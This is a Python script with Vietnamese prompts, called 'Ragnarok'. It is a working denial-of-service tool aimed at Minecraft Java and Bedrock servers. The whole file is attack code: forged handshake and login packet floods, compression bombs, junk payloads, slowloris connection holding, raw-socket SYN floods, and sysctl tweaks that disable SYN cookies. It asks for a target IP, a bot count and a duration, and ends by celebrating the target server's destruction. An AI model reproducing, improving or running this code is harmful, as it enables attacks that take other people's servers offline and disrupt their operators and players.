#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════════╗
# ║  THOR'S RAGNAROK - v1.21.1 FOCUSED DESTROYER             ║
# ║  TẬP TRUNG PROTOCOL 1.21.1 + TẤT CẢ PHIÊN BẢN KHÁC       ║
# ╚══════════════════════════════════════════════════════════════╝
import socket, threading, time, sys, random, struct, os, multiprocessing, re, zlib

try:
    import resource
    resource.setrlimit(resource.RLIMIT_NOFILE, (4194304, 4194304))
    resource.setrlimit(resource.RLIMIT_NPROC, (4194304, 4194304))
except: pass

try:
    os.system('sysctl -w net.ipv4.tcp_tw_reuse=1 2>/dev/null')
    os.system('sysctl -w net.ipv4.ip_local_port_range="1024 65535" 2>/dev/null')
    os.system('sysctl -w net.core.somaxconn=65535 2>/dev/null')
    os.system('sysctl -w net.ipv4.tcp_max_syn_backlog=65535 2>/dev/null')
    os.system('sysctl -w net.core.netdev_max_backlog=65535 2>/dev/null')
    os.system('sysctl -w net.ipv4.tcp_syncookies=0 2>/dev/null')
    os.system('sysctl -w net.ipv4.tcp_max_tw_buckets=2000000 2>/dev/null')
    os.system('sysctl -w net.ipv4.tcp_fin_timeout=1 2>/dev/null')
except: pass

attack_flag = True
stats = {'sent': 0, 'failed': 0, 'bytes': 0, 'slowloris': 0, 'syn': 0, 'active_conn': 0}
stats_lock = threading.Lock()

# PROTOCOL CHO 1.21.1 (767) + TẤT CẢ PHIÊN BẢN KHÁC
# 767 = 1.21.1 chính thức
ALL_PROTOCOLS = [
    767, 767, 767, 767, 767,  # 50% là 1.21.1 (tập trung)
    766, 765, 764, 763, 762, 761, 760, 759, 758, 757, 756, 755,
    754, 753, 751, 736, 735, 578, 575, 573, 498, 490, 485, 480, 477,
    404, 401, 393, 340, 338, 335, 316, 315, 210, 110, 109, 107, 47, 5, 4
]

BEDROCK_PROTOCOLS = [686,685,680,671,662,630,622,594,589,582,575,560,554,544,534,527,503,486,475,471,465,448,440,431,422,419,408,407,390,389,388,361,354,340,332,313,291,282,274]

class C:
    G='\033[92m'; R='\033[91m'; Y='\033[93m'; C='\033[96m'; M='\033[95m'; W='\033[97m'; B='\033[1m'; X='\033[0m'

def banner():
    print(f"""{C.R}{C.B}
⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡
{C.Y}╔══════════════════════════════════════════════════════════╗
║  {C.R}☢☢☢ RAGNAROK - MINECRAFT 1.21.1 DESTROYER ☢☢☢{C.Y}       ║
║  {C.W}50% PROTOCOL 1.21.1 (767) + 50% CÁC ĐỜI KHÁC{C.Y}             ║
║  {C.W}BEDROCK + JAVA + SLOWLORIS + BOMB + JUNK + SYN{C.Y}          ║
╚══════════════════════════════════════════════════════════╝{C.X}
⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡
""")

def clean(text, dot=False):
    text = text.strip().replace(' ','').replace('\t','').replace('\n','').replace('\r','')
    text = text.replace('\u200b','').replace('\u200c','').replace('\u200d','').replace('\ufeff','').replace('\u00a0','')
    return re.sub(r'[^a-zA-Z0-9\.\-]', '', text) if dot else re.sub(r'[^0-9]', '', text)

def mkvar(v):
    if v < 128: return bytes([v])
    r = bytearray()
    while True:
        b = v & 0x7F; v >>= 7
        if v != 0: b |= 0x80
        r.append(b)
        if v == 0: break
    return bytes(r)

def mkstr(t): return mkvar(len(e:=t.encode())) + e

class PreForkedPool:
    def __init__(s, h, p, size=500):
        s.host=h; s.port=p; s.size=size; s.pool=[]
        s.lock=threading.Lock()
        for _ in range(size//2): s.pool.append(s._mk())
        threading.Thread(target=s._refill, daemon=True).start()
    def _mk(s):
        try:
            sk=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sk.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sk.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
            sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sk.setblocking(False)
            try: sk.connect((s.host, s.port))
            except BlockingIOError: pass
            except: return None
            return sk
        except: return None
    def get(s):
        with s.lock:
            if s.pool: return s.pool.pop()
        return s._mk()
    def _refill(s):
        global attack_flag
        while attack_flag:
            with s.lock:
                while len(s.pool)<s.size:
                    sk=s._mk()
                    if sk: s.pool.append(sk)
            time.sleep(0.05)

class PacketCache:
    def __init__(s, h, p):
        s.host=h; s.port=p; s.hs=mkstr(h); s.pb=struct.pack('>H', p)
        s.jc={}
        for pr in set(ALL_PROTOCOLS):
            i=b'\x00'+mkvar(pr)+s.hs+s.pb
            s.jc[f's_{pr}']=mkvar(len(i)+1)+i+b'\x01'
            s.jc[f'l_{pr}']=mkvar(len(i)+1)+i+b'\x02'
        s.jc['sr']=b'\x01\x00'
        s.bc={}
        for pr in BEDROCK_PROTOCOLS:
            ping=b'\x01'+struct.pack('>Q',random.randint(0,2**63-1))+b'\x00'*16+b'\x00'*8
            s.bc[f'ping_{pr}']=ping
            oq=b'\x05'+b'\x00'*16+struct.pack('B',pr%256)+b'\x00'*random.randint(100,1400)
            s.bc[f'oq_{pr}']=oq
        s.bombs=[struct.pack('>i',sz)+zlib.compress(b'\x00'*sz,level=1) for sz in [50000,100000,150000,200000]]
        s.junks=[b'\x00'*sz for sz in [100,500,1000,2000,5000,10000,20000]]
    
    def gjs(s):
        pr=random.choice(ALL_PROTOCOLS)
        return s.jc.get(f's_{pr}',s.jc[f's_{767}'])+b'\x00'*random.randint(0,200)
    
    def gjl(s):
        pr=random.choice(ALL_PROTOCOLS)
        return s.jc.get(f'l_{pr}',s.jc[f'l_{767}'])+b'\x00'*random.randint(0,100)
    
    def gjsr(s): return s.jc['sr']
    
    def gjlp(s):
        nl=random.randint(3,30)
        n=f"RAG{random.randint(0,99999999):08d}"+''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789_') for _ in range(nl))
        return mkvar(len(n)+1)+b'\x00'+mkstr(n)
    
    def gbp(s):
        pr=random.choice(BEDROCK_PROTOCOLS)
        return s.bc.get(f'ping_{pr}',s.bc[f'ping_{BEDROCK_PROTOCOLS[0]}'])
    
    def gboq(s):
        pr=random.choice(BEDROCK_PROTOCOLS)
        return s.bc.get(f'oq_{pr}',s.bc[f'oq_{BEDROCK_PROTOCOLS[0]}'])
    
    def gbomb(s): return random.choice(s.bombs)
    def gjunk(s): return random.choice(s.junks)

class RagnarokWorker:
    def __init__(s,h,p,d,pc,pool): s.host=h; s.port=p; s.e=time.time()+d; s.pc=pc; s.pool=pool; s.addr=(h,p)
    
    def run(s):
        global attack_flag, stats
        while time.time()<s.e and attack_flag:
            b=0; bt=0
            for _ in range(500):
                if time.time()>=s.e or not attack_flag: break
                try:
                    sk=s.pool.get()
                    if sk is None:
                        sk=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                        sk.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
                        sk.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,131072)
                        sk.settimeout(0.02)
                        sk.connect(s.addr)
                    else:
                        sk.settimeout(0.02)
                    
                    r=random.random()
                    if r<0.25: sk.sendall(s.pc.gjs()+s.pc.gjsr())
                    elif r<0.45: sk.sendall(s.pc.gjl()); sk.sendall(s.pc.gjlp())
                    elif r<0.55: sk.sendall(s.pc.gjl()); sk.sendall(s.pc.gjlp()); sk.sendall(s.pc.gbomb())
                    elif r<0.65: sk.sendall(s.pc.gjs()+s.pc.gjsr()); sk.sendall(s.pc.gjunk())
                    elif r<0.80: sk.sendall(s.pc.gjl()); sk.sendall(s.pc.gjlp()); [sk.sendall(s.pc.gjunk()) for _ in range(random.randint(1,5))]
                    else: sk.sendall(s.pc.gjs()+s.pc.gjsr()); sk.sendall(s.pc.gbomb()); sk.sendall(s.pc.gjunk())
                    sk.close(); b+=1; bt+=random.randint(100,10000)
                except: pass
            
            for _ in range(200):
                if time.time()>=s.e or not attack_flag: break
                try:
                    usk=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                    usk.settimeout(0.01)
                    usk.sendto(s.pc.gbp(),(s.host,s.port))
                    usk.sendto(s.pc.gboq(),(s.host,s.port))
                    usk.close(); b+=2; bt+=300
                except: pass
            
            with stats_lock: stats['sent']+=b; stats['bytes']+=bt

class SlowlorisHorde:
    def __init__(s,h,p,d,pc): s.host=h; s.port=p; s.e=time.time()+d; s.pc=pc; s.conns=[]
    
    def run(s):
        global attack_flag, stats
        while time.time()<s.e and attack_flag:
            batch=0
            for _ in range(50):
                if time.time()>=s.e or not attack_flag: break
                try:
                    sk=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    sk.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
                    sk.settimeout(0.5)
                    sk.connect((s.host,s.port))
                    sk.send(s.pc.gjl()); sk.send(s.pc.gjlp())
                    s.conns.append(sk); batch+=1
                    with stats_lock: stats['slowloris']+=1; stats['active_conn']+=1
                except: pass
            alive=[]
            for sk in s.conns:
                try: sk.send(b'\x00'*random.randint(1,5)); alive.append(sk)
                except:
                    try: sk.close()
                    except: pass
                    with stats_lock: stats['active_conn']-=1
            s.conns=alive
            time.sleep(random.uniform(8,15))

class SynFloodWorker:
    def __init__(s,h,p,d): s.host=h; s.port=p; s.e=time.time()+d
    def run(s):
        global attack_flag, stats
        try:
            sk=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
            sk.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
        except: return
        while time.time()<s.e and attack_flag:
            batch=0
            for _ in range(1000):
                if time.time()>=s.e or not attack_flag: break
                try:
                    tcp=struct.pack('!HHIIBBHHH',random.randint(1024,65535),s.port,random.randint(0,4294967295),0,0x50,0x02,65535,0,0)
                    sk.sendto(tcp,(s.host,s.port)); batch+=1
                except: pass
            with stats_lock: stats['sent']+=batch; stats['syn']+=batch

def launch_ragnarok(h,p,d,pc,pool,wc):
    ws=[threading.Thread(target=RagnarokWorker(h,p,d,pc,pool).run) for _ in range(wc)]
    for t in ws: t.daemon=True; t.start()
    for t in ws: t.join(timeout=1)

def launch_slowloris(h,p,d,pc,wc):
    ws=[threading.Thread(target=SlowlorisHorde(h,p,d,pc).run) for _ in range(wc)]
    for t in ws: t.daemon=True; t.start()
    for t in ws: t.join(timeout=1)

def launch_syn(h,p,d,wc):
    ws=[threading.Thread(target=SynFloodWorker(h,p,d).run) for _ in range(wc)]
    for t in ws: t.daemon=True; t.start()
    for t in ws: t.join(timeout=1)

def main():
    global attack_flag, stats
    banner()
    
    while True:
        h=clean(input(f"{C.W}[?] IP: {C.G}"),dot=True)
        if h and len(h)>=3: break
        print(f"{C.R}[!] Nhập lại!{C.X}")
    try:
        rip=socket.gethostbyname(h)
        if rip!=h: print(f"{C.G}[✓] {h} → {rip}{C.X}")
    except: print(f"{C.R}[!] Không phân giải được!{C.X}"); sys.exit(1)
    
    while True:
        pi=clean(input(f"{C.W}[?] PORT: {C.G}"))
        if pi=='': p=25565; print(f"{C.G}[✓] 25565{C.X}"); break
        try:
            p=int(pi)
            if 1<=p<=65535: break
            print(f"{C.R}[!] 1-65535!{C.X}")
        except: print(f"{C.R}[!] Số!{C.X}")
    
    while True:
        try:
            bc=int(clean(input(f"{C.W}[?] BOT (5000-50000): {C.G}")))
            if bc>0: break
            print(f"{C.R}[!] >0!{C.X}")
        except: print(f"{C.R}[!] Số!{C.X}")
    
    while True:
        try:
            dr=int(clean(input(f"{C.W}[?] GIÂY: {C.G}")))
            if dr>0: break
            print(f"{C.R}[!] >0!{C.X}")
        except: print(f"{C.R}[!] Số!{C.X}")
    
    print(f"\n{C.R}╔════════════════════════════════╗{C.X}")
    print(f"{C.R}║ {C.W}IP: {C.G}{h}:{p}{C.X}{C.R}                    ║")
    print(f"{C.R}║ {C.W}BOT: {C.G}{bc} | GIÂY: {C.G}{dr}{C.X}{C.R}               ║")
    print(f"{C.R}║ {C.W}MC: {C.G}1.21.1 (767) + ALL{C.X}{C.R}         ║")
    print(f"{C.R}╚════════════════════════════════╝{C.X}\n")
    
    if input(f"{C.R}{C.B}[☢] GÕ 'PHÁ': {C.G}").strip().upper()!='PHÁ': print(f"{C.Y}HỦY!{C.X}"); sys.exit(0)
    
    print(f"\n{C.R}{C.B}⚡ RAGNAROK 1.21.1 ĐANG GIÁNG XUỐNG... ⚡{C.X}\n")
    
    pc=PacketCache(h,p)
    pool=PreForkedPool(h,p,size=min(1000,bc*2))
    
    cpu=multiprocessing.cpu_count()
    np=min(cpu*8,bc//10) if bc>10 else 1
    if np<1: np=1
    
    rw=int(bc*0.6)//np
    sw=max(1,int(bc*0.25)//np)
    synw=max(1,int(bc*0.15)//np)
    
    st=time.time(); ps=[]
    for i in range(np):
        pr1=multiprocessing.Process(target=launch_ragnarok,args=(h,p,dr,pc,pool,rw))
        pr2=multiprocessing.Process(target=launch_slowloris,args=(h,p,dr,pc,sw))
        pr1.daemon=True; pr2.daemon=True; ps.append(pr1); ps.append(pr2); pr1.start(); pr2.start()
        if synw>0:
            pr3=multiprocessing.Process(target=launch_syn,args=(h,p,dr,synw))
            pr3.daemon=True; ps.append(pr3); pr3.start()
    
    try:
        ls=0
        while time.time()-st<dr and attack_flag:
            time.sleep(1); el=time.time()-st
            with stats_lock:
                se=stats['sent']; fa=stats['failed']; mb=stats['bytes']/1024/1024
                sl=stats['slowloris']; sy=stats['syn']; ac=stats['active_conn']
            cr=se-ls; ls=se
            bl=min(60,int(cr/2000))
            bar='█'*bl+'░'*(60-bl)
            print(f"\r{C.R}[{el:.0f}s]{C.X} {C.Y}[{bar}]{C.X} {C.G}{se:,}{C.X} | {C.R}{fa:,}{C.X} | {C.M}{cr:,}{C.X}/s | {C.C}{mb:.1f}MB | {C.R}SL:{sl} SYN:{sy} ACT:{ac}{C.X}   ",end='')
    except KeyboardInterrupt: print(f"\n{C.Y}DỪNG!{C.X}"); attack_flag=False
    
    attack_flag=False
    for pr in ps: pr.join(timeout=3)
    for pr in ps:
        if pr.is_alive(): pr.terminate()
    
    el=time.time()-st; fr=stats['sent']/el if el>0 else 0
    
    print(f"\n\n{C.R}{C.B}╔════════════════════════════════╗{C.X}")
    print(f"{C.R}{C.B}║  ☢☢☢ RAGNAROK KẾT THÚC ☢☢☢{C.X}{C.R}{C.B} ║")
    print(f"{C.R}{C.B}║ {C.W}TỔNG GÓI: {C.G}{stats['sent']:,}{C.X}{C.R}{C.B}                 ║")
    print(f"{C.R}{C.B}║ {C.W}TỐC ĐỘ: {C.G}{fr:,.0f} gói/s{C.X}{C.R}{C.B}                ║")
    print(f"{C.R}{C.B}║ {C.W}TRAFFIC: {C.G}{stats['bytes']/1024/1024:.1f} MB{C.X}{C.R}{C.B}              ║")
    print(f"{C.R}{C.B}╚════════════════════════════════╝{C.X}\n")
    
    if fr>=50000: print(f"{C.R}{C.B}☢☢☢ SERVER 1.21.1 ĐÃ BỊ HỦY DIỆT! ☢☢☢{C.X}\n")
    elif fr>=10000: print(f"{C.G}{C.B}☢ SERVER ĐÃ BAY MÀU! ☢{C.X}\n")

if __name__=="__main__":
    try: os.nice(-20)
    except: pass
    main()